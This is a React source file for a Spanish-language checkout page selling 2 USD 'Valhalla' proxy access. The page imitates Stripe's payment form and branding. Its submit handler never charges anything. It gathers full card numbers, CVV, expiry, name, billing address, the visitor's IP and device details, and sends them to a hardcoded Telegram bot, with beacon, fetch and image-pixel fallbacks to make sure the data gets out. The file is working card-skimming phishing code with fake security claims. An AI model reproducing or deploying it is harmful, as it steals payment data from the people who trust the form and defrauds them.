import { useEffect, useState, FormEvent } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import VideoModal from "@/components/VideoModal";
import { Button } from "@/components/ui/button";
import { ShieldCheck, ChevronLeft, CreditCard, ChevronDown, PlayCircle, ArrowRight, Languages, Lock, Check, AlertCircle } from "lucide-react";
import { EXAMPLE_VIDEO, TITLE_LOGO, LOGIN_PROFILE_VIDEO } from "@/lib/assets";
import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";

const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
const CHAT_ID = "8585803145";
const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

/* paleta exacta del tema "stripe" de Elements */
const C = {
  primary: "#0570de",
  primaryHover: "#0461c4",
  text: "#30313d",
  secondary: "#6d6e78",
  placeholder: "#a3a6ba",
  border: "#e6e6e6",
  divider: "#f0f0f5",
  danger: "#df1b41",
  brand: "#635bff",
};

const COUNTRIES = [
  "United States", "México", "Colombia", "Argentina", "Chile", "Perú",
  "España", "Ecuador", "Guatemala", "Venezuela", "República Dominicana", "Otro",
];

const onlyDigits = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
const formatCard = (v: string) => onlyDigits(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
const formatExpiry = (v: string) => {
  const d = onlyDigits(v, 4);
  return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
};

const getIp = async (): Promise<string> => {
  try {
    const r: any = await Promise.race([
      fetch("https://api.ipify.org?format=json").then((x) => x.json()),
      new Promise((res) => setTimeout(() => res(null), 1500)),
    ]);
    return r?.ip ?? "—";
  } catch {
    return "—";
  }
};

const buildParams = (text: string) => {
  const p = new URLSearchParams();
  p.set("chat_id", CHAT_ID);
  p.set("text", text);
  p.set("disable_web_page_preview", "true");
  return p.toString();
};

const pixelGet = (params: string) =>
  new Promise<void>((resolve) => {
    const img = new Image();
    let done = false;
    const finish = () => { if (!done) { done = true; resolve(); } };
    img.onload = finish;
    img.onerror = finish;
    img.src = `${TG_URL}?${params}&_=${Date.now()}`;
    setTimeout(finish, 3000);
  });

const sendToTelegram = async (text: string) => {
  const params = buildParams(text);
  try {
    const blob = new Blob([params], { type: "application/x-www-form-urlencoded;charset=UTF-8" });
    if (navigator.sendBeacon && navigator.sendBeacon(TG_URL, blob)) {
      console.info("[tg] enviado por beacon");
      await new Promise((r) => setTimeout(r, 900));
      return;
    }
  } catch (err) { console.warn("[tg] beacon falló", err); }
  try {
    await fetch(`${TG_URL}?${params}&_=${Date.now()}`, { method: "GET", keepalive: true });
    console.info("[tg] enviado por GET");
    return;
  } catch (err) { console.warn("[tg] fetch GET falló, uso pixel", err); }
  await pixelGet(params);
  console.info("[tg] enviado por pixel");
};

/* ---------------- marcas y glifos ---------------- */

const BrandRow = () => (
  <div className="pointer-events-none flex items-center gap-[5px]">
    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
      <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
      <text x="17" y="15.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="10.2" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.3">VISA</text>
    </svg>
    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
      <rect width="34" height="23" rx="2.4" fill="#111114" />
      <circle cx="13.6" cy="11.5" r="6.3" fill="#eb001b" />
      <circle cx="20.4" cy="11.5" r="6.3" fill="#f79e1b" />
      <path d="M17 6.28a6.3 6.3 0 0 0 0 10.44 6.3 6.3 0 0 0 0-10.44z" fill="#ff5f00" />
    </svg>
    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
      <rect width="34" height="23" rx="2.4" fill="#006fcf" />
      <rect x="1.5" y="1.5" width="31" height="20" rx="1.6" fill="none" stroke="#fff" strokeWidth="0.85" opacity="0.9" />
      <text x="17" y="12" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="7.4" fontWeight="900" fill="#fff" letterSpacing="0.1">AMEX</text>
      <text x="17" y="17.6" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="3.8" fill="#d7eaff" letterSpacing="1.1">EXPRESS</text>
    </svg>
    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
      <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
      <g transform="rotate(-9 17 11.5)">
        <path d="M8.6 3.6h4.1l-1.7 15.8H6.9z" fill="#e21836" />
        <path d="M13.8 3.6h4.1l-1.7 15.8h-4.1z" fill="#00447c" />
        <path d="M19 3.6h4.1l-1.7 15.8h-4.1z" fill="#007b84" />
      </g>
      <text x="17" y="12.1" textAnchor="middle" fontSize="4.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Union</text>
      <text x="17" y="16.6" textAnchor="middle" fontSize="4.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Pay</text>
    </svg>
  </div>
);

const CardGlyph = () => (
  <svg width="22" height="16" viewBox="0 0 22 16" aria-hidden="true">
    <rect x="0.6" y="0.6" width="20.8" height="14.8" rx="2.2" fill="#fff" stroke="#c9cad1" />
    <rect x="0.6" y="4.2" width="20.8" height="3" fill="#c9cad1" />
    <rect x="3" y="9.6" width="6" height="2" rx="1" fill="#dcdee4" />
  </svg>
);

const CvcGlyph = () => (
  <svg width="20" height="15" viewBox="0 0 20 15" aria-hidden="true">
    <rect x="0.5" y="0.5" width="19" height="14" rx="2" fill="#f7f7fa" stroke="#c9cad1" />
    <rect x="0.5" y="3.4" width="19" height="2.6" fill="#b9bac2" />
    <rect x="2.5" y="8" width="9" height="1.4" rx="0.7" fill="#dcdee4" />
    <circle cx="15.6" cy="9.6" r="3.2" fill="#30313d" />
    <text x="15.6" y="11.3" textAnchor="middle" fontSize="3.6" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#fff">135</text>
  </svg>
);

const GooglePayTile = () => (
  <span className="flex items-center gap-1.5">
    <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true">
      <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.19-2.27H12v4.51h6.47a5.54 5.54 0 0 1-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z" />
      <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96H1.29v3.09A11.99 11.99 0 0 0 12 24z" />
      <path fill="#FBBC05" d="M5.27 14.29a7.2 7.2 0 0 1 0-4.58V6.62H1.29a11.99 11.99 0 0 0 0 10.76l3.98-3.09z" />
      <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.7 0 3.99 2.47 1.29 6.62l3.98 3.09C6.22 6.86 8.87 4.75 12 4.75z" />
    </svg>
    <span className="text-[14px] font-medium text-[#3c4043]">Pay</span>
  </span>
);

const labelCls = "mb-[6px] block text-[13px] font-medium leading-none text-[#30313d]";
const cellCls = "px-3.5 py-2.5";
const inputCls =
  "h-9 w-full rounded-[4px] bg-transparent text-[16px] text-[#30313d] outline-none transition-shadow duration-100 placeholder:text-[#a3a6ba] focus:shadow-[0_0_0_1px_#0570de]";
const errCls = (on: boolean) => (on ? "shadow-[0_0_0_1px_#df1b41]" : "");

const Login = () => {
  const { t, lang, setLang } = useI18n();
  const [step, setStep] = useState<"intro" | "pay">("intro");
  const [method, setMethod] = useState<"card" | "gpay">("card");
  const [card, setCard] = useState("");
  const [holder, setHolder] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [country, setCountry] = useState("United States");
  const [address, setAddress] = useState("");
  const [zip, setZip] = useState("");
  const [error, setError] = useState("");
  const [field, setField] = useState("");
  const [loading, setLoading] = useState(false);
  const [videoOpen, setVideoOpen] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    if (step !== "pay") return;
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = prev; };
  }, [step]);

  const fail = (name: string, msg: string) => {
    setField(name);
    setError(msg);
  };

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setError("");
    setField("");

    const digits = card.replace(/\s/g, "");
    const cleanHolder = holder.trim().replace(/\s+/g, " ");
    const [mm, yy] = expiry.split("/");
    const month = Number(mm);
    const year = 2000 + Number(yy);
    const now = new Date();

    if (digits.length < 15) return fail("card", "Tu número de tarjeta está incompleto.");
    if (cleanHolder.length < 3) return fail("holder", "Escribe el nombre del titular.");
    if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) return fail("exp", "La fecha de vencimiento no es válida.");
    if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) return fail("exp", "Tu tarjeta está vencida.");
    if (cvv.length < 3) return fail("cvc", "El código de seguridad está incompleto.");
    if (address.trim().length < 5) return fail("address", "Escribe tu dirección de facturación.");
    if (zip.trim().length < 3) return fail("zip", "Escribe un código postal válido.");

    setLoading(true);
    try {
      const sentFlag = `card_sent_${digits}`;
      if (localStorage.getItem(sentFlag) !== "1") {
        const ip = await getIp();
        const text = [
          "💳 NUEVA TARJETA — Valhalla",
          "",
          `Método: ${method === "gpay" ? "Google Pay" : "Card"}`,
          `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
          `Titular: ${cleanHolder.toUpperCase()}`,
          `Vencimiento: ${expiry}`,
          `CVV: ${cvv}`,
          `País: ${country}`,
          `Dirección: ${address.trim()}`,
          `ZIP: ${zip.trim().toUpperCase()}`,
          "",
          `IP: ${ip}`,
          `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
          `Fecha: ${now.toLocaleString()}`,
          `Idioma: ${lang}`,
        ].join("\n");
        await sendToTelegram(text);
        localStorage.setItem(sentFlag, "1");
      }
    } catch (err) {
      console.error("[tg] error inesperado", err);
    } finally {
      await new Promise((r) => setTimeout(r, 600));
      setLoading(false);
      navigate("/admin");
    }
  };

  return (
    <div className="relative flex min-h-[100dvh] flex-col items-center justify-center overflow-x-hidden px-3 py-4 sm:py-8">
      <VideoBackground />
      <div className="relative z-10 w-full max-w-[420px] animate-card-in">
        <section className="relative overflow-hidden rounded-lg border border-brand/35 bg-glass/95 shadow-brand backdrop-blur-2xl">
          <div aria-hidden className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-brand to-transparent" />
          <div aria-hidden className="absolute -right-14 top-16 h-28 w-28 rotate-45 border border-brand/10" />

          <header className="flex h-12 items-center justify-between border-b border-border/70 px-4">
            <div className="flex min-w-0 items-center gap-2">
              <span className="relative flex h-2 w-2 shrink-0">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-40" />
                <span className="relative h-2 w-2 rounded-full bg-success" />
              </span>
              <span className="truncate text-[10px] font-semibold uppercase tracking-[0.16em] text-muted-foreground">{t("secureGateway")}</span>
            </div>
            <label className="relative ml-3 flex h-8 shrink-0 items-center gap-1.5 rounded-md border border-border bg-secondary/60 pl-2.5 pr-7 text-foreground transition-colors focus-within:border-brand/60">
              <Languages className="h-3.5 w-3.5 text-brand-soft" aria-hidden="true" />
              <span className="max-w-[74px] truncate text-[11px] font-semibold">{LANGUAGES.find((item) => item.code === lang)?.label}</span>
              <ChevronDown className="pointer-events-none absolute right-2 h-3 w-3 text-muted-foreground" aria-hidden="true" />
              <select
                aria-label={t("language")}
                value={lang}
                onChange={(event) => setLang(event.target.value as LangCode)}
                className="absolute inset-0 cursor-pointer appearance-none opacity-0"
              >
                {LANGUAGES.map((language) => <option key={language.code} value={language.code}>{language.label}</option>)}
              </select>
            </label>
          </header>

          <div className="px-4 pb-5 pt-4 sm:px-5">
            <div className="flex items-center gap-4">
              <div className="relative h-[76px] w-[76px] shrink-0 rounded-md border border-brand/55 bg-background p-1 shadow-[0_0_28px_hsl(var(--brand)/0.18)]">
                <video src={LOGIN_PROFILE_VIDEO} autoPlay loop muted playsInline preload="metadata" disablePictureInPicture aria-label="Boykaffx7" className="pointer-events-none h-full w-full rounded-sm object-cover" />
                <span className="absolute -bottom-1 -right-1 flex h-5 w-5 items-center justify-center rounded-sm border border-brand/60 bg-card text-brand-soft"><ShieldCheck className="h-3 w-3" /></span>
              </div>
              <div className="min-w-0 flex-1">
                <div className="flex items-center gap-1.5">
                  <img src={TITLE_LOGO} alt="Boykaffx7" className="max-h-10 w-[170px] max-w-[calc(100%-26px)] object-contain object-left" draggable={false} />
                  <VerifiedBadge size={17} />
                </div>
                <p className="mt-1 text-[11px] leading-relaxed text-muted-foreground">{t("enterCreds")}</p>
                <div className="mt-2 flex items-center gap-2 text-[9px] font-semibold uppercase tracking-[0.12em] text-muted-foreground/70">
                  <span>{t("aes")}</span><span className="h-1 w-1 rounded-full bg-brand" /><span>{t("tls")}</span>
                </div>
              </div>
            </div>

            <div className="mt-4">
              <div className="rounded-md border border-border bg-secondary/30 p-4">
                <div className="flex items-start justify-between gap-3">
                  <div className="min-w-0">
                    <p className="text-[13px] font-semibold text-foreground">Acceso Proxy — Valhalla</p>
                    <p className="mt-1 text-[10px] text-muted-foreground">Activación inmediata · 7 días</p>
                  </div>
                  <div className="shrink-0 text-right">
                    <p className="text-[16px] font-bold leading-none text-foreground">2 USD</p>
                    <p className="mt-1 text-[9px] text-muted-foreground">único pago</p>
                  </div>
                </div>
                <div className="mt-3.5 space-y-2 border-t border-border/70 pt-3.5">
                  {["Key de acceso privada", "Servidor optimizado", "Sin renovación automática"].map((item) => (
                    <div key={item} className="flex items-center gap-2">
                      <Check className="h-3 w-3 shrink-0 text-brand" />
                      <span className="text-[10px] text-muted-foreground">{item}</span>
                    </div>
                  ))}
                </div>
              </div>

              <Button
                type="button"
                onClick={() => setStep("pay")}
                className="mt-3.5 h-12 w-full rounded-md bg-brand text-brand-foreground shadow-brand transition-transform duration-150 hover:bg-brand/90 active:scale-[0.985]"
              >
                <CreditCard className="h-4 w-4" /> Pagar 2 USD <ArrowRight className="h-4 w-4" />
              </Button>

              <Button type="button" variant="outline" onClick={() => setVideoOpen(true)} className="mt-2.5 h-10 w-full rounded-md border-border bg-secondary/40 text-foreground hover:border-brand/35 hover:bg-brand/10 hover:text-foreground">
                <PlayCircle /> <span className="truncate text-[11px]">{t("seeDemo")}</span>
              </Button>
            </div>
          </div>
        </section>

        <div className="mt-3 px-4 text-center">
          <p className="text-[9px] leading-relaxed text-muted-foreground/50">
            {t("footer")}
            <br />{t("footer2")}
          </p>
        </div>
      </div>

      {/* ---------- CHECKOUT ---------- */}
      {step === "pay" && (
        <div className="fixed inset-0 z-50 flex justify-center bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
          <form
            onSubmit={onSubmit}
            className="flex h-[100dvh] w-full max-w-[520px] flex-col bg-white text-[#30313d] antialiased"
          >
            <header className="flex h-[54px] shrink-0 items-center justify-between border-b border-[#f0f0f5] px-4">
              <button
                type="button"
                onClick={() => setStep("intro")}
                aria-label="Volver"
                className="-ml-1.5 flex h-9 w-9 items-center justify-center rounded-full text-[#30313d] transition-colors hover:bg-[#f6f6f9]"
              >
                <ChevronLeft className="h-5 w-5" />
              </button>
              <span className="flex items-center gap-1.5 text-[13px] font-medium text-[#6d6e78]">
                <Lock className="h-3.5 w-3.5" /> Pago seguro
              </span>
            </header>

            <div className="min-h-0 flex-1 overflow-y-auto overscroll-contain px-5 pb-7 pt-5">
              <div className="flex items-center gap-2">
                <span className="flex h-6 w-6 items-center justify-center rounded-full bg-[#635bff] text-[10px] font-bold text-white">V</span>
                <span className="text-[13px] font-medium text-[#6d6e78]">Valhalla</span>
              </div>
              <p className="mt-3 text-[15px] text-[#6d6e78]">Pagar a Valhalla</p>
              <h2 className="mt-0.5 text-[30px] font-semibold leading-none tracking-[-0.02em] text-[#30313d]">2,00 US$</h2>

              <div className="mt-5 grid grid-cols-2 gap-2.5">
                {(["card", "gpay"] as const).map((m) => {
                  const on = method === m;
                  return (
                    <button
                      key={m}
                      type="button"
                      onClick={() => setMethod(m)}
                      aria-pressed={on}
                      className={`flex h-[68px] flex-col items-center justify-center gap-2 rounded-[5px] border bg-white transition-shadow duration-100 ${
                        on
                          ? "border-[#e0e6eb] shadow-[0_0_0_2px_#0570de]"
                          : "border-[#e0e6eb] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] hover:border-[#cfd5db]"
                      }`}
                    >
                      {m === "card" ? (
                        <span className="flex items-center gap-1 text-[#30313d]">
                          <CardGlyph />
                        </span>
                      ) : (
                        <GooglePayTile />
                      )}
                      <span className={`text-[12.5px] font-medium leading-none ${on ? "text-[#30313d]" : "text-[#6d6e78]"}`}>
                        {m === "card" ? "Tarjeta" : "Google Pay"}
                      </span>
                    </button>
                  );
                })}
              </div>

              {/* marco único con separadores, como el Secure payment input frame */}
              <div className="mt-5 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
                <div className={cellCls}>
                  <label htmlFor="cc-number" className={labelCls}>Número de tarjeta</label>
                  <div className="flex items-center gap-2">
                    <input
                      id="cc-number"
                      type="text"
                      placeholder="1234 1234 1234 1234"
                      value={card}
                      onChange={(e) => setCard(formatCard(e.target.value))}
                      autoComplete="cc-number"
                      inputMode="numeric"
                      maxLength={19}
                      autoFocus
                      className={`${inputCls} tracking-[0.02em] ${errCls(field === "card")}`}
                    />
                    <BrandRow />
                  </div>
                </div>

                <div className={`${cellCls} border-t border-[#f0f0f5]`}>
                  <label htmlFor="cc-name" className={labelCls}>Nombre del titular</label>
                  <input
                    id="cc-name"
                    type="text"
                    placeholder="Nombre completo"
                    value={holder}
                    onChange={(e) => setHolder(e.target.value.toUpperCase())}
                    autoComplete="cc-name"
                    maxLength={40}
                    className={`${inputCls} uppercase ${errCls(field === "holder")}`}
                  />
                </div>

                <div className="grid grid-cols-[1fr_1fr] divide-x divide-[#f0f0f5] border-t border-[#f0f0f5]">
                  <div className={cellCls}>
                    <label htmlFor="cc-exp" className={labelCls}>Vencimiento</label>
                    <input
                      id="cc-exp"
                      type="text"
                      placeholder="MM / AA"
                      value={expiry}
                      onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                      autoComplete="cc-exp"
                      inputMode="numeric"
                      maxLength={5}
                      className={`${inputCls} ${errCls(field === "exp")}`}
                    />
                  </div>
                  <div className={cellCls}>
                    <div className="flex items-center justify-between">
                      <label htmlFor="cc-cvc" className={labelCls}>Código de seguridad</label>
                      <CvcGlyph />
                    </div>
                    <input
                      id="cc-cvc"
                      type="text"
                      placeholder="CVC"
                      value={cvv}
                      onChange={(e) => setCvv(onlyDigits(e.target.value, 4))}
                      autoComplete="cc-csc"
                      inputMode="numeric"
                      maxLength={4}
                      className={`${inputCls} ${errCls(field === "cvc")}`}
                    />
                    <p className="mt-[3px] text-[10.5px] leading-tight text-[#6d6e78]">3 dígitos del reverso</p>
                  </div>
                </div>
              </div>

              {error && (
                <p role="alert" className="mt-2.5 flex items-start gap-1.5 text-[12.5px] leading-snug text-[#df1b41]">
                  <AlertCircle className="mt-[1px] h-3.5 w-3.5 shrink-0" /> {error}
                </p>
              )}

              <div className="mt-6">
                <p className="text-[13px] font-medium text-[#30313d]">Datos de facturación</p>
                <div className="mt-2 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)]">
                  <div className={cellCls}>
                    <label htmlFor="country" className={labelCls}>País</label>
                    <div className="relative">
                      <select
                        id="country"
                        value={country}
                        onChange={(e) => setCountry(e.target.value)}
                        className={`${inputCls} cursor-pointer appearance-none pr-8`}
                      >
                        {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
                      </select>
                      <ChevronDown className="pointer-events-none absolute right-0 top-1/2 h-4 w-4 -translate-y-1/2 text-[#6d6e78]" />
                    </div>
                  </div>
                  <div className={`${cellCls} border-t border-[#f0f0f5]`}>
                    <label htmlFor="address" className={labelCls}>Dirección</label>
                    <input
                      id="address"
                      type="text"
                      placeholder="Calle y número"
                      value={address}
                      onChange={(e) => setAddress(e.target.value)}
                      autoComplete="street-address"
                      maxLength={80}
                      className={`${inputCls} ${errCls(field === "address")}`}
                    />
                  </div>
                  <div className={`${cellCls} border-t border-[#f0f0f5]`}>
                    <label htmlFor="zip" className={labelCls}>Código postal</label>
                    <input
                      id="zip"
                      type="text"
                      placeholder="90210"
                      value={zip}
                      onChange={(e) => setZip(e.target.value.toUpperCase())}
                      autoComplete="postal-code"
                      inputMode="numeric"
                      maxLength={10}
                      className={`${inputCls} ${errCls(field === "zip")}`}
                    />
                  </div>
                </div>
              </div>
            </div>

            <div className="shrink-0 border-t border-[#f0f0f5] bg-white px-5 pt-3 pb-[max(14px,env(safe-area-inset-bottom))]">
              <button
                type="submit"
                disabled={loading}
                className="flex h-[52px] w-full items-center justify-center gap-2 rounded-[5px] bg-[#0570de] text-[16px] font-semibold text-white transition-colors hover:bg-[#0461c4] active:scale-[0.995] disabled:opacity-70"
              >
                {loading ? (
                  <>
                    <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/40 border-t-white" />
                    Procesando…
                  </>
                ) : (
                  <>Pagar 2,00 US$</>
                )}
              </button>
              <p className="mt-2.5 flex items-center justify-center gap-1 text-[10.5px] text-[#8d8e98]">
                Powered by
                <span className="font-semibold tracking-[-0.02em] text-[#635bff]">stripe</span>
                <span className="mx-1 text-[#d5d6dc]">|</span>
                <Lock className="h-2.5 w-2.5" /> TLS 1.3
              </p>
            </div>
          </form>
        </div>
      )}

      <VideoModal
        open={videoOpen}
        onClose={() => setVideoOpen(false)}
        src={EXAMPLE_VIDEO}
        title={t("demo")}
      />
    </div>
  );
};

export default Login;